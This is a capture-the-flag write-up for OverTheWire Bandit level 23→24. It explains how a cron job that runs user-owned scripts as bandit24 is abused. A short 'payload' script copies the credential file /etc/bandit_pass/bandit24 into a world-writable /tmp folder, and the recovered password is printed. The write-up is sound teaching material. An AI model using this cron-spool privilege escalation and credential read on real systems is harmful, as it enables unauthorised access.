# OverTheWire : Bandit Level 23 → Level 24 Writeup
**Date:** July 25, 2026  

---

##  Level Goal
A program is running automatically at regular intervals from **cron** (the time-based job scheduler). Look in `/etc/cron.d/` for the configuration and see what command is being executed.

>  **NOTE 1:** This level requires you to create your own first shell script. This is a significant milestone!
>  **NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a local copy around.

---

##  Investigation & Analysis

### 1. Inspecting the Cron Configuration
First, check the cron directory to see what tasks are scheduled:
```bash
bandit23@bandit:~$ ls /etc/cron.d/
cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root
```

Since we need the password for `bandit24`, let's examine `cronjob_bandit24`:
```bash
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```
* **Analysis:** The script `/usr/bin/cronjob_bandit24.sh` is executed automatically every minute (`* * * * *`) and at system boot (`@reboot`). It runs with the privileges of the **`bandit24`** user.

### 2. Dissecting the Target Shell Script
Let's look inside `/usr/bin/cronjob_bandit24.sh`:
```bash
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

#### Code Breakdown:
1. `myname=$(whoami)`: Saves the executing user's name (`bandit24`) into the variable `$myname`.
2. `cd /var/spool/$myname`: Changes the working directory to `/var/spool/bandit24`.
3. `for i in * .*;`: Loops through every standard and hidden file in that directory.
4. `if [ "$i" != "." -a "$i" != ".." ];`: Ensures the script ignores the current (`.`) and parent (`..`) directories.
5. `owner="$(stat --format "%U" ./$i)"`: Checks the owner username of the file.
6. `if [ "${owner}" = "bandit23" ]; then timeout -s 9 60 ./$i`: **Crucial Step.** If the file belongs to `bandit23` (us), the cron job will execute it. It allows it to run for up to 60 seconds before sending a SIGKILL (`-s 9`).
7. `rm -f ./$i`: Deletes the script immediately after running or timing out.

---

##  Exploitation Strategy
Because the script runs as `bandit24`, any file it executes inherits `bandit24` privileges. We can exploit this to read the password file `/etc/bandit_pass/bandit24` (which `bandit23` normally cannot read) and dump it into a readable directory.

### 1. Environment Setup
Create a workspace inside `/tmp`:
```bash
bandit23@bandit:~$ mkdir /tmp/rand
bandit23@bandit:~$ cd /tmp/rand
```

### 2. Crafting the Payload (`script.sh`)
Create a file named `script.sh` using a text editor (e.g., `nano`) and insert the malicious payload:
```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/rand/password
```

### 3. Creating the Target Output File
Initialize an empty file where the password will be written:
```bash
bandit23@bandit:/tmp/rand$ touch password
```

### 4. Permissive Permissions Configuration
Since `bandit24` needs to execute our script and write data into our `password` file, we must set permissive permissions:
```bash
bandit23@bandit:/tmp/rand$ chmod +x script.sh
bandit23@bandit:/tmp/rand$ chmod 666 /tmp/rand/password
bandit23@bandit:/tmp/rand$ chmod 777 /tmp/rand
```

Verifying permissions:
```bash
bandit23@bandit:/tmp/rand$ ls -l
total 8
-rw-rw-rw- 1 bandit23 bandit23 33 Jul 25 09:14 password
-rwxrwxrwx 1 bandit23 bandit23 63 Jul 25 08:54 script.sh
```

### 5. Launching the Script
Copy the script to the cron spool directory. The automated job will pick it up within a minute:
```bash
bandit23@bandit:/tmp/rand$ cp script.sh /var/spool/bandit24/
```

### 6. Retrieving the Flag
After waiting a minute, read the target file:
```bash
bandit23@bandit:~$ cat /tmp/rand/password
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```
**Flag Found:** `hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv`

---

## Lessons Learned & Mistakes Made

Tracking errors during the exploitation phase provides valuable insights into modern Linux navigation and permissions:

### 1. Relative vs. Absolute Paths
*Mistake:* Running `cd tmp/rand` directly from the home directory.
* error: `-bash: cd: tmp/rand: No such file or directory`
* *Correction:* `/tmp` is located at the root directory level. Always use an absolute path (`cd /tmp/rand`) or ensure you understand your current working directory relative to the target.

### 2. Target Spool Directory Misplacement
*Mistake:* Attempting to copy the payload to a nested directory structure: `cp script.sh /var/spool/bandit24/foo/`
*  *Correction:* The cron script checks files inside `/var/spool/bandit24` directly. Adding a subfolder (`/foo/`) will cause the script to ignore the payload entirely since the loop doesn't search recursively. Ensure files match the exact path evaluated by the target script.

### 3. Misinterpreting Command Prompts
*Mistake:* Typing `/tmp/rand$ cat password` directly into the terminal while located in the home directory.
* error: `-bash: /tmp/rand$: No such file or directory`
* *Correction:* The terminal prompt string `bandit23@bandit:/tmp/rand$` was accidentally included in the command. When issuing commands, isolate the utility name and paths (`cat /tmp/rand/password`) from terminal interface copy-pastes.

### 4. Handling Missing Home Configuration Folders
* Observation:* When launching `nano script.sh`, the system raised: `Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory`. 
* *Insight:* Wargame levels often strip or isolate write privileges in standard user homes to enforce clean environments. This did not hinder execution, as long as the file was successfully opened and modified within the accessible `/tmp` directory.